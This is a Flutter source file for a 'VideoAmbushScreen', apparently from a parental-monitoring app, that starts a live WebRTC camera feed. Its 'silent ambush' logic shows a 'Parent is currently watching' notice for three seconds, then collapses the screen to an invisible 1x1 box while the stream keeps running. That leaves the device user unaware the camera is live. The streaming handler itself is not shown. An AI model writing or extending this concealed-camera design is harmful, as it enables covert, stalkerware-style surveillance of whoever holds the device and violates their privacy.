import 'package:flutter/material.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import '../telemetry/webrtc_stream_handler.dart';

class VideoAmbushScreen extends StatefulWidget {
  final String sessionId;
  const VideoAmbushScreen({super.key, required this.sessionId});

  @override
  State<VideoAmbushScreen> createState() => _VideoAmbushScreenState();
}

class _VideoAmbushScreenState extends State<VideoAmbushScreen> {
  late WebRTCStreamHandler _webRTCHandler;
  bool _isInitializing = true;
  bool _isHidden = false;

  @override
  void initState() {
    super.initState();
    _webRTCHandler = WebRTCStreamHandler(sessionId: widget.sessionId);
    _webRTCHandler.onStopAmbush = () {
      if (mounted) Navigator.of(context).pop();
    };
    _initializeWebRTC();
  }

  Future<void> _initializeWebRTC() async {
    await _webRTCHandler.initialize();
    if (mounted) {
      setState(() {
        _isInitializing = false;
      });
      // SILENT AMBUSH LOGIC: Hide UI completely after 3 seconds of showing warning
      Future.delayed(const Duration(seconds: 3), () {
        if (mounted) {
          setState(() {
            _isHidden = true;
          });
        }
      });
    }
  }

  @override
  void dispose() {
    _webRTCHandler.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    if (_isHidden) {
      // Shrink to completely invisible 1x1 box but keep route alive
      return const SizedBox(width: 1, height: 1); 
    }

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          if (_isInitializing)
            const Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: Colors.redAccent),
                  SizedBox(height: 16),
                  Text(
                    "Establishing Secure Video Link...",
                    style: TextStyle(color: Colors.white, fontFamily: 'monospace'),
                  ),
                ],
              ),
            )
          else
            Positioned.fill(
              child: RTCVideoView(
                _webRTCHandler.localRenderer,
                objectFit: RTCVideoViewObjectFit.RTCVideoViewObjectFitCover,
                mirror: true,
              ),
            ),
          
          // HUD Overlay
          Positioned(
            top: 40,
            left: 20,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.redAccent.withValues(alpha: 0.8),
                borderRadius: BorderRadius.circular(8),
              ),
              child: const Row(
                children: [
                  Icon(Icons.fiber_manual_record, color: Colors.white, size: 12),
                  SizedBox(width: 8),
                  Text("LIVE FEED ACTIVE", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
                ],
              ),
            ),
          ),
          Positioned(
            top: 40,
            right: 20,
            child: IconButton(
              icon: const Icon(Icons.close, color: Colors.white, size: 30),
              onPressed: () => Navigator.of(context).pop(),
            ),
          ),
          const Positioned(
            bottom: 40,
            left: 0,
            right: 0,
            child: Center(
              child: Text(
                "Parent is currently watching.\nTelemetry overlays are handled via Vercel dashboard.",
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.white70, fontSize: 12),
              ),
            ),
          )
        ],
      ),
    );
  }
}
